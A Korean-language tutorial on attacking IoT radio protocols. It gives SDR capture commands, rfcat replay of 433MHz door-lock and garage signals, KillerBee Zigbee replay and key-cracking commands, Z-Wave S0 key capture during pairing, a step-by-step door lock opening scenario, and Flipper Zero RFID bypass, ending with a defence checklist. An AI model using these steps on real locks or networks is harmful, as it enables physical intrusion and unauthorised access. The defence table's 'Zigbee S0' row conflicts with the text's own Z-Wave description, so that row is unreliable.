# RF/Zigbee/Z-Wave IoT 무선 프로토콜 공격

## 개요

IoT 기기는 WiFi 외에도 Zigbee, Z-Wave, 433MHz, 915MHz 등 다양한 무선 프로토콜을 사용한다. 저전력·저비용 설계로 인해 보안이 취약한 경우가 많다.

---

## SDR(Software Defined Radio) 개요

전통적인 하드웨어 무선 수신기 대신 소프트웨어로 신호를 처리한다.

### 주요 SDR 하드웨어

| 장비 | 주파수 범위 | 가격 | 용도 |
|------|------------|------|------|
| RTL-SDR v3 | 500kHz~1.75GHz | ~$30 | 입문, 수신 전용 |
| HackRF One | 1MHz~6GHz | ~$300 | 송수신 가능 |
| YARD Stick One | Sub-1GHz | ~$100 | 433/868/915MHz 전용 |
| USRP B210 | 70MHz~6GHz | ~$1,500 | 연구용 고성능 |
| Flipper Zero | Sub-1GHz + NFC | ~$170 | 올인원 보안 도구 |

### SDR 소프트웨어

```bash
# GNU Radio 설치 (신호 처리 프레임워크)
sudo apt install gnuradio

# RTL-SDR 드라이버
sudo apt install rtl-sdr

# SDR++ (GUI 스펙트럼 분석기)
# https://github.com/AlexandreRouma/SDRPlusPlus

# GQRX (GNU Radio 기반 GUI)
sudo apt install gqrx-sdr

# URH (Universal Radio Hacker) - 프로토콜 분석
pip install urh
```

---

## RTL-SDR 기본 사용법

```bash
# 장치 감지 확인
rtl_test -t

# FM 라디오 수신 (테스트)
rtl_fm -f 89.1M -M wbfm -s 200000 -r 48000 - | aplay -r 48000 -f S16_LE

# 원시 IQ 샘플 캡처 (433MHz)
rtl_sdr -f 433.92M -s 2000000 -n 10000000 capture.bin

# 특정 주파수 모니터링
rtl_power -f 430M:440M:25k -g 50 -i 1 -1 power.csv
```

---

## 433MHz/915MHz 리플레이 공격

### 도어락, 차고문, 리모컨 공격

```bash
# rfcat으로 신호 캡처 (YARD Stick One)
rfcat -r   # 인터랙티브 셸

# rfcat 내에서:
d.setFreq(433920000)   # 433.92MHz
d.setMdmModulation(MOD_ASK_OOK)  # OOK 변조 방식
d.setMdmDRate(4800)    # 데이터 레이트
d.RFrecv()             # 수신 시작

# 신호 재전송 (리플레이)
# 캡처된 데이터를 그대로 전송
d.RFxmit(data)
```

### URH로 프로토콜 분석

```bash
# URH 실행
urh

# 또는 커맨드라인
urh -f 433.92e6 -s 2e6 --capture 5 -o capture.complex

# 분석 (자동 비트 경계 감지)
urh capture.complex
```

### Python + rtl-sdr 스펙트럼 스캐너

```python
#!/usr/bin/env python3
"""
RF Spectrum Scanner - 특정 대역 신호 탐지
사용법: python3 rf_scanner.py --freq 433.92 --sample-rate 2000000
"""

import argparse
import struct
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path


def capture_samples(
    freq_hz: float,
    sample_rate: int,
    duration_sec: float,
    gain: int = 40,
) -> bytes:
    num_samples = int(sample_rate * duration_sec)
    cmd = [
        "rtl_sdr",
        "-f", str(int(freq_hz)),
        "-s", str(sample_rate),
        "-g", str(gain),
        "-n", str(num_samples),
        "-",
    ]
    result = subprocess.run(cmd, capture_output=True, timeout=duration_sec + 5)
    return result.stdout


def compute_power_db(samples: bytes) -> float:
    """IQ 샘플에서 신호 세기(dB) 계산"""
    if len(samples) < 2:
        return -100.0

    values = list(samples)
    # RTL-SDR IQ 포맷: unsigned 8-bit, I/Q 교대
    i_vals = [v - 128 for v in values[0::2]]
    q_vals = [v - 128 for v in values[1::2]]

    power = sum(i**2 + q**2 for i, q in zip(i_vals, q_vals))
    avg_power = power / max(len(i_vals), 1)

    import math
    return 10 * math.log10(avg_power + 1e-10)


def scan_frequencies(
    frequencies_mhz: list[float],
    sample_rate: int = 2_000_000,
    duration: float = 0.5,
) -> dict[float, float]:
    results: dict[float, float] = {}

    def measure(freq: float) -> tuple[float, float]:
        samples = capture_samples(freq * 1e6, sample_rate, duration)
        power = compute_power_db(samples)
        return freq, power

    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = {executor.submit(measure, f): f for f in frequencies_mhz}
        for future in futures:
            freq, power = future.result()
            results[freq] = power

    return results


def monitor_frequency(
    freq_mhz: float,
    threshold_db: float = 30.0,
    sample_rate: int = 2_000_000,
) -> None:
    print(f"[*] {freq_mhz}MHz 모니터링 시작 (임계값: {threshold_db}dB)")
    print("[*] Ctrl+C로 중지")

    baseline_samples = capture_samples(freq_mhz * 1e6, sample_rate, 1.0)
    baseline_power = compute_power_db(baseline_samples)
    print(f"[*] 기저 노이즈: {baseline_power:.1f}dB")

    try:
        while True:
            samples = capture_samples(freq_mhz * 1e6, sample_rate, 0.2)
            power = compute_power_db(samples)
            delta = power - baseline_power

            if delta > threshold_db:
                timestamp = time.strftime("%H:%M:%S")
                print(f"[!] {timestamp} — 신호 탐지! {power:.1f}dB (+{delta:.1f}dB)")
            else:
                print(f"\r[*] {power:.1f}dB ({delta:+.1f}dB)", end="", flush=True)

            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[*] 모니터링 중지")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="RF Spectrum Scanner (RTL-SDR 필요)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  python3 rf_scanner.py --freq 433.92 --monitor
  python3 rf_scanner.py --scan 433.0 433.5 434.0 868.0 915.0
  python3 rf_scanner.py --freq 433.92 --capture 5 --output capture.bin
        """,
    )
    parser.add_argument("--freq", type=float, help="중심 주파수 (MHz)")
    parser.add_argument("--scan", nargs="+", type=float, help="스캔할 주파수 목록 (MHz)")
    parser.add_argument("--monitor", action="store_true", help="실시간 모니터링")
    parser.add_argument("--capture", type=float, help="캡처 시간 (초)")
    parser.add_argument("--output", type=Path, help="캡처 파일 저장 경로")
    parser.add_argument("--threshold", type=float, default=20.0, help="탐지 임계값 (dB)")
    parser.add_argument("--sample-rate", type=int, default=2_000_000, help="샘플레이트")

    args = parser.parse_args()

    if args.scan:
        print(f"[*] {len(args.scan)}개 주파수 스캔 중...")
        results = scan_frequencies(args.scan, args.sample_rate)
        print("\n주파수별 신호 세기:")
        for freq in sorted(results):
            power = results[freq]
            bar = "█" * int(max(0, power) / 5)
            print(f"  {freq:8.3f} MHz: {power:6.1f} dB  {bar}")
    elif args.freq and args.monitor:
        monitor_frequency(args.freq, args.threshold, args.sample_rate)
    elif args.freq and args.capture:
        samples = capture_samples(
            args.freq * 1e6, args.sample_rate, args.capture
        )
        if args.output:
            args.output.write_bytes(samples)
            print(f"[+] 캡처 완료: {len(samples)} bytes → {args.output}")
        else:
            print(f"[+] 캡처: {len(samples)} bytes")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

---

## Zigbee 공격

### KillerBee 프레임워크

```bash
# 설치 (Python 2/3 지원)
pip install killerbee

# 지원 하드웨어: RZUSBSTICK, ApiMote, ATUSB

# Zigbee 채널 스캔 (11~26)
zbstumbler -i /dev/ttyUSB0

# 패킷 캡처
zbdump -i /dev/ttyUSB0 -c 11 -w capture.pcap

# 네트워크 키 없이 패킷 분석
zbdecode -r capture.pcap

# 리플레이 공격
zbreplay -r capture.pcap -i /dev/ttyUSB0

# 키 크래킹 (ZigBee 2006/2007 TP-Link 기본 키)
zbkey -r capture.pcap
```

### Wireshark로 Zigbee 분석

```bash
# Zigbee 패킷 캡처 후 Wireshark에서 분석
# Edit → Preferences → Protocols → ZigBee → Security Keys에 키 추가

# tshark로 커맨드라인 분석
tshark -r zigbee.pcap \
  -Y "zbee_nwk" \
  -T fields \
  -e zbee_nwk.src \
  -e zbee_nwk.dst \
  -e zbee_nwk.frame_type
```

---

## Z-Wave 취약점

### Z-Wave 프로토콜 개요

```
주파수: 908.42MHz (미국), 868.42MHz (유럽)
범위: 30m (실내), 100m (실외)
보안 모드:
  - S0: 전송 중 키 교환 (취약)
  - S2: ECDH 기반 키 교환 (2017+)
```

### Z-Wave S0 취약점

```bash
# z-wave-js 기반 스니핑 (HackRF 필요)
# OWL+: Z-Wave 스니퍼 하드웨어 필요

# S0 네트워크 키는 페어링 시 일반 텍스트로 전송
# 페어링 과정을 캡처하면 네트워크 키 획득 가능

# z-wave-js-server로 로컬 Z-Wave 네트워크 분석
# npm install -g z-wave-js
```

---

## 스마트홈 공격 시나리오

### 시나리오: 스마트 도어락 공격

```
1. 433MHz 도어락 리모컨 신호 캡처
2. RTL-SDR로 신호 분석 (OOK 변조, 2400bps)
3. URH에서 비트 패턴 식별
4. YARD Stick One으로 동일 신호 재전송
5. 도어락 열림

방어: 롤링 코드(Hopping Code) 사용 여부 확인
- 롤링 코드: 매번 다른 코드 생성 (keeloq 등)
- 정적 코드: 리플레이 공격에 취약
```

### Flipper Zero 활용

```
# Flipper Zero Sub-GHz 기능
1. 주파수 스캔
2. 신호 캡처
3. 리플레이
4. 신호 분석

# NFC/RFID 기능
1. MIFARE Classic 카드 읽기
2. 카드 시뮬레이션
3. 취약한 RFID 접근통제 우회
```

---

## 방어 체크리스트

| 취약점 | 방어 방법 |
|--------|-----------|
| 433MHz 정적 코드 | 롤링 코드(KeeLoq) 또는 암호화 프로토콜 사용 |
| Zigbee S0 | Z-Wave S2 또는 Thread 프로토콜로 업그레이드 |
| 미암호화 통신 | 네트워크 레이어 암호화 (AES-128 이상) |
| 디폴트 키 | 페어링 시 고유 키 생성, 하드코딩 키 금지 |
| 신호 재밍 | 재밍 탐지 및 알림 기능 |
